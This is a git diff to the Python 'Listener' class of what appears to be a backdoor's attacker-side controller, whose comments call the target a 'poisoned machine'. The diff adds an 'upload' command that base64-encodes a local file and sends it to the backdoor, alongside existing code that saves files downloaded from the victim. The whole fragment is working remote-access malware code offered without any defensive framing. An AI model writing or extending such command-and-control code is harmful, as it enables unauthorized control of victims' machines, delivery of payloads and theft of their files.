@@ -41,11 +41,19 @@ class Listener:
             file.write(base64.b64decode(content))  # decodes the encoded file from poisoned machine
             return "[+] Download successful."
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
             # command = input(">> ") Use this for python3 implementation
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)
+
             result = self.execute_remotely(command)  # sends list to backdoor
 
             if command[0] == "download":
